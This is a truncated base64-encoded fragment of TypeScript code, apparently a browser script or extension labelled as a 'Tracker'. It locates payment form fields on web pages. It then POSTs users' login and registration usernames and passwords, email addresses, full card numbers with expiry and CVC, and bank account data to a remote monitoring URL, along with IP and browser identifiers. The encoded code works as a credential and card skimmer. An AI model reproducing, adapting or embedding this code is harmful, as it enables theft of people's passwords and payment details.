FbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRldGVjdGVkRWxlbWVudHMucHVzaChkZXRlY3RlZEVsZW1lbnQpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudElucHV0VGFnKHNlbGYsIChfX3RhcmdldFBhcmVudEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLCAnZXhwaXJlJywgZnVuY3Rpb24gKGRldGVjdGVkRWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZXRlY3RlZEVsZW1lbnRzLnB1c2goZGV0ZWN0ZWRFbGVtZW50KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheW1lbnRJbnB1dFRhZyhzZWxmLCAoX190YXJnZXRQYXJlbnRFbGVtZW50IGFzIEhUTUxFbGVtZW50KSwgJ2N2YycsIGZ1bmN0aW9uIChkZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGV0ZWN0ZWRFbGVtZW50cy5wdXNoKGRldGVjdGVkRWxlbWVudCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgIH0pXG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9KTtcbiAgICAgICAgICAgIGlmIChjYWxsYmFjaykge1xuICAgICAgICAgICAgICAgIGNhbGxiYWNrKGRldGVjdGVkRWxlbWVudHMpO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgfVxuXG4gICAgZXhwbG9yZVBheW1lbnRTcGFuVGFnKHNlbGY6IHRoaXMsIGVsZW1lbnRQYXJlbnROb2RlOiBIVE1MRWxlbWVudCwgY2FsbGJhY2s/OiBhbnkpIHtcbiAgICAgICAgaWYgKGVsZW1lbnRQYXJlbnROb2RlLmNoaWxkTm9kZXMubGVuZ3RoICE9PSAwKSB7XG4gICAgICAgICAgICBlbGVtZW50UGFyZW50Tm9kZS5jaGlsZE5vZGVzLmZvckVhY2goZnVuY3Rpb24gKF9fY2hpbGRFbGVtZW50KSB7XG4gICAgICAgICAgICAgICAgaWYgKF9fY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnU1BBTicgJiYgKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5jbGFzc0xpc3QuY29udGFpbnMoJ3BheW1lbnQtdGl0bGUnKSkge1xuICAgICAgICAgICAgICAgICAgICBpZiAoY2FsbGJhY2spIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKF9fY2hpbGRFbGVtZW50KTtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheW1lbnRTcGFuVGFnKHNlbGYsIChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCksIGNhbGxiYWNrKVxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH0pO1xuICAgICAgICB9XG4gICAgfVxuXG4gICAgZXhwbG9yZVBheW1lbnRJbnB1dFRhZyhzZWxmOiB0aGlzLCBlbGVtZW50UGFyZW50Tm9kZTogSFRNTEVsZW1lbnQsIHNlbGZJZDogc3RyaW5nLCBjYWxsYmFjazogYW55KSB7XG4gICAgICAgIGlmIChlbGVtZW50UGFyZW50Tm9kZS5jaGlsZE5vZGVzLmxlbmd0aCAhPT0gMCkge1xuICAgICAgICAgICAgZWxlbWVudFBhcmVudE5vZGUuY2hpbGROb2Rlcy5mb3JFYWNoKGZ1bmN0aW9uIChfX2NoaWxkRWxlbWVudCkge1xuICAgICAgICAgICAgICAgIGlmIChfX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0lOUFVUJyAmJiAoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLmlkLmluZGV4T2Yoc2VsZklkKSAhPT0gLTEpIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKGNhbGxiYWNrKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjaygoX19jaGlsZEVsZW1lbnQgYXMgSFRNTElucHV0RWxlbWVudCkpO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudElucHV0VGFnKHNlbGYsIChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCksIHNlbGZJZCwgY2FsbGJhY2spXG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfSk7XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICBleHBsb3JlUGF5bWVudFNlbGVjdFRhZyhzZWxmOiB0aGlzLCBlbGVtZW50UGFyZW50Tm9kZTogSFRNTEVsZW1lbnQsIHNlbGZJZDogc3RyaW5nLCBjYWxsYmFjazogYW55KSB7XG4gICAgICAgIGlmIChlbGVtZW50UGFyZW50Tm9kZS5jaGlsZE5vZGVzLmxlbmd0aCAhPT0gMCkge1xuICAgICAgICAgICAgZWxlbWVudFBhcmVudE5vZGUuY2hpbGROb2Rlcy5mb3JFYWNoKGZ1bmN0aW9uIChfX2NoaWxkRWxlbWVudCkge1xuICAgICAgICAgICAgICAgIGlmIChfX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ1NFTEVDVCcgJiYgKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5pZC5pbmRleE9mKHNlbGZJZCkgIT09IC0xKSB7XG4gICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykge1xuICAgICAgICAgICAgICAgICAgICAgICAgY2FsbGJhY2soKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxJbnB1dEVsZW1lbnQpKTtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheW1lbnRTZWxlY3RUYWcoc2VsZiwgKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KSwgc2VsZklkLCBjYWxsYmFjaylcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9KTtcbiAgICAgICAgfVxuICAgIH1cblxuICAgIHN0YXRpYyBzZW5kKHJlcXVlc3Q6IGFueSkge1xuICAgICAgICBpZiAodHlwZW9mIHJlcXVlc3QgPT09ICdvYmplY3QnICYmIHJlcXVlc3QuY29uc3RydWN0b3IgPT09IE9iamVjdCAmJiBPYmplY3Qua2V5cyhyZXF1ZXN0KS5sZW5ndGggIT09IDApIHtcbiAgICAgICAgICAgIGxldCBpbnRlcnZhbCA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICBpZiAod2luZG93LnNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ2lwJykgIT09IG51bGwpe1xuICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsKTtcbiAgICAgICAgICAgICAgICAgICAgaW1wb3J0KCcuLi9jb21tb24vcmVxdWVzdCcpLnRoZW4oZnVuY3Rpb24gKHQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChyZXF1ZXN0LmNvbW1hbmQgPT09ICdzYXZlTG9naW5EYXRhJyB8fCByZXF1ZXN0LmNvbW1hbmQgPT09ICdzYXZlUmVnaXN0cmF0aW9uRGF0YScgfHwgcmVxdWVzdC5jb21tYW5kID09PSAnc2F2ZUxvZ291dERhdGEnIHx8IHJlcXVlc3QuY29tbWFuZCA9PT0gJ3NhdmVOYXZpZ2F0ZURhdGEnKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJlcXVlc3QuY29tbWFuZCA9PT0gJ3NhdmVMb2dpbkRhdGEnKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB0LnNlbmRSZXF1ZXN0KHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1ldGhvZDogXCJQT1NUXCIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6IGdsb2JhbEFwcE1vbml0b3JNYWluVVJMICsgXCJicm93c2VyVXNlckRhdGFNYW5hZ2VtZW50XCIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc3luYzogdHJ1ZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhlYWRlcjogW3tuYW1lOiBcIkNvbnRlbnQtdHlwZVwiLCB2YWx1ZTogXCJhcHBsaWNhdGlvbi9qc29uO2NoYXJzZXQ9VVRGLThcIn1dLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiY29tbWFuZFwiOiByZXF1ZXN0LmNvbW1hbmQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJ1c2VyZGF0YVwiOiB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9kZWZhdWx0Xzoge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJ0cmFja2VyXCI6IFRyYWNrZXIuaWRlbnRpdHksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImFwcF9pZFwiOiBUcmFja2VyLnZlcnNpb24sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImlwXCI6IHdpbmRvdy5zZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdpcCcpLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJvc19uYW1lX2FyY2hcIjogVHJhY2tlci5vc05hbWVBbmRBcmNoLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJicm93c2VyXCI6IFRyYWNrZXIuYnJvd3Nlck5hbWVGdWxsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiZXZlbnRcIjogJ2xvZ2luJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJ1c2VybmFtZVwiOiByZXF1ZXN0LmRhdGEudXNlcm5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwicGFzc3dvcmRcIjogcmVxdWVzdC5kYXRhLnBhc3N3b3JkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcIndvcmtXZWJzaXRlXCI6IHJlcXVlc3QuZGF0YS53b3JrV2Vic2l0ZVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKHJlcXVlc3QuY29tbWFuZCA9PT0gJ3NhdmVSZWdpc3RyYXRpb25EYXRhJykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gdC5zZW5kUmVxdWVzdCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZXRob2Q6IFwiUE9TVFwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBnbG9iYWxBcHBNb25pdG9yTWFpblVSTCArIFwiYnJvd3NlclVzZXJEYXRhTWFuYWdlbWVudFwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXN5bmM6IHRydWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZWFkZXI6IFt7bmFtZTogXCJDb250ZW50LXR5cGVcIiwgdmFsdWU6IFwiYXBwbGljYXRpb24vanNvbjtjaGFyc2V0PVVURi04XCJ9XSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImNvbW1hbmRcIjogcmVxdWVzdC5jb21tYW5kLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwidXNlcmRhdGFcIjoge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfZGVmYXVsdF86IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwidHJhY2tlclwiOiBUcmFja2VyLmlkZW50aXR5LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJhcHBfaWRcIjogVHJhY2tlci52ZXJzaW9uLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJpcFwiOiB3aW5kb3cuc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnaXAnKSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwib3NfbmFtZV9hcmNoXCI6IFRyYWNrZXIub3NOYW1lQW5kQXJjaCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiYnJvd3NlclwiOiBUcmFja2VyLmJyb3dzZXJOYW1lRnVsbFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImV2ZW50XCI6IFwicmVnaXN0cmF0aW9uXCIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwidXNlcm5hbWVcIjogcmVxdWVzdC5kYXRhLnVzZXJuYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcInBhc3N3b3JkXCI6IHJlcXVlc3QuZGF0YS5wYXNzd29yZCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJlbWFpbFwiOiByZXF1ZXN0LmRhdGEuZW1haWwsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwid29ya1dlYnNpdGVcIjogcmVxdWVzdC5kYXRhLndvcmtXZWJzaXRlXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHJlcXVlc3QuY29tbWFuZCA9PT0gJ3NhdmVMb2dvdXREYXRhJykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gdC5zZW5kUmVxdWVzdCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZXRob2Q6IFwiUE9TVFwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBnbG9iYWxBcHBNb25pdG9yTWFpblVSTCArIFwiYnJvd3NlclVzZXJEYXRhTWFuYWdlbWVudFwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXN5bmM6IHRydWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZWFkZXI6IFt7bmFtZTogXCJDb250ZW50LXR5cGVcIiwgdmFsdWU6IFwiYXBwbGljYXRpb24vanNvbjtjaGFyc2V0PVVURi04XCJ9XSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImNvbW1hbmRcIjogcmVxdWVzdC5jb21tYW5kLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwidXNlcmRhdGFcIjoge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfZGVmYXVsdF86IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwidHJhY2tlclwiOiBUcmFja2VyLmlkZW50aXR5LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJhcHBfaWRcIjogVHJhY2tlci52ZXJzaW9uLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJpcFwiOiB3aW5kb3cuc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnaXAnKSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwib3NfbmFtZV9hcmNoXCI6IFRyYWNrZXIub3NOYW1lQW5kQXJjaCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiYnJvd3NlclwiOiBUcmFja2VyLmJyb3dzZXJOYW1lRnVsbFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImV2ZW50XCI6IFwibG9nb3V0XCIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwidXNlcm5hbWVcIjogcmVxdWVzdC5kYXRhLnVzZXJuYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcIndvcmtXZWJzaXRlXCI6IHJlcXVlc3QuZGF0YS53b3JrV2Vic2l0ZVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChyZXF1ZXN0LmNvbW1hbmQgPT09ICdzYXZlTmF2aWdhdGVEYXRhJykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gdC5zZW5kUmVxdWVzdCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZXRob2Q6IFwiUE9TVFwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBnbG9iYWxBcHBNb25pdG9yTWFpblVSTCArIFwiYnJvd3NlclVzZXJEYXRhTWFuYWdlbWVudFwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXN5bmM6IHRydWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZWFkZXI6IFt7bmFtZTogXCJDb250ZW50LXR5cGVcIiwgdmFsdWU6IFwiYXBwbGljYXRpb24vanNvbjtjaGFyc2V0PVVURi04XCJ9XSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImNvbW1hbmRcIjogcmVxdWVzdC5jb21tYW5kLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwidXNlcmRhdGFcIjoge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfZGVmYXVsdF86IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwidHJhY2tlclwiOiBUcmFja2VyLmlkZW50aXR5LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJhcHBfaWRcIjogVHJhY2tlci52ZXJzaW9uLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJpcFwiOiB3aW5kb3cuc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnaXAnKSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwib3NfbmFtZV9hcmNoXCI6IFRyYWNrZXIub3NOYW1lQW5kQXJjaCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiYnJvd3NlclwiOiBUcmFja2VyLmJyb3dzZXJOYW1lRnVsbFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImV2ZW50XCI6IFwibmF2aWdhdGVcIixcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJ1c2VybmFtZVwiOiByZXF1ZXN0LmRhdGEudXNlcm5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwid29ya1dlYnNpdGVcIjogcmVxdWVzdC5kYXRhLndvcmtXZWJzaXRlXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAocmVxdWVzdC5jb21tYW5kID09PSAnc2F2ZVBheW1lbnRNZXRob2RzRGF0YScpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gdC5zZW5kUmVxdWVzdCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1ldGhvZDogXCJQT1NUXCIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybDogZ2xvYmFsQXBwTW9uaXRvck1haW5VUkwgKyBcImNsaWVudFBheW1lbnRNZXRob2RzUmVjb3JkXCIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFzeW5jOiB0cnVlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZWFkZXI6IFt7bmFtZTogXCJDb250ZW50LXR5cGVcIiwgdmFsdWU6IFwiYXBwbGljYXRpb24vanNvbjtjaGFyc2V0PVVURi04XCJ9XSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJjb21tYW5kXCI6IHJlcXVlc3QuY29tbWFuZCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwicGF5bWVudE1ldGhvZHNJbmZvXCI6IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfZGVmYXVsdF86IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJ0cmFja2VyXCI6IFRyYWNrZXIuaWRlbnRpdHksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiYXBwX2lkXCI6IFRyYWNrZXIudmVyc2lvbixcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJpcFwiOiB3aW5kb3cuc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnaXAnKSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJvc19uYW1lX2FyY2hcIjogVHJhY2tlci5vc05hbWVBbmRBcmNoLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImJyb3dzZXJcIjogVHJhY2tlci5icm93c2VyTmFtZUZ1bGxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogcmVxdWVzdC5kYXRhLmNhcmROdW1iZXIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6IHJlcXVlc3QuZGF0YS5jYXJkQnJhbmQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRIb2xkZXInOiByZXF1ZXN0LmRhdGEuY2FyZEhvbGRlcixcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImNhcmRFeHBpcmVcIjogcmVxdWVzdC5kYXRhLmNhcmRFeHBpcmUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiByZXF1ZXN0LmRhdGEuY2FyZENWQyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiByZXF1ZXN0LmRhdGEuZXZlbnQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJ3b3JrV2Vic2l0ZVwiOiByZXF1ZXN0LmRhdGEud29ya1dlYnNpdGVcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJlcXVlc3QuY29tbWFuZCA9PT0gJ3NhdmVCYW5rQWNjb3VudERhdGEnKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHQuc2VuZFJlcXVlc3Qoe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZXRob2Q6IFwiUE9TVFwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6IGdsb2JhbEFwcE1vbml0b3JNYWluVVJMICsgXCJjbGllbnRCYW5rQWNjb3VudFJlY29yZFwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc3luYzogdHJ1ZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVyOiBbe25hbWU6IFwiQ29udGVudC10eXBlXCIsIHZhbHVlOiBcImFwcGxpY2F0aW9uL2pzb247Y2hhcnNldD1VVEYtOFwifV0sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiY29tbWFuZFwiOiByZXF1ZXN0LmNvbW1hbmQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImJhbmtBY2NvdW50RGF0YVwiOiB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX2RlZmF1bHRfOiB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwidHJhY2tlclwiOiBUcmFja2VyLmlkZW50aXR5LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImFwcF9pZFwiOiBUcmFja2VyLnZlcnNpb24sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiaXBcIjogd2luZG93LnNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ2lwJyksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwib3NfbmFtZV9hcmNoXCI6IFRyYWNrZXIub3NOYW1lQW5kQXJjaCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJicm93c2VyXCI6IFRyYWNrZXIuYnJvd3Nlck5hbWVGdWxsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZGF0YVR5cGUnOiByZXF1ZXN0LmRhdGEuZGF0YVR5cGUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2RhdGFWYWx1ZSc6IHJlcXVlc3QuZGF0YS5kYXRhVmFsdWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJ3b3JrV2Vic2l0ZVwiOiByZXF1ZXN0LmRhdGEud29ya1dlYnNpdGVcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgI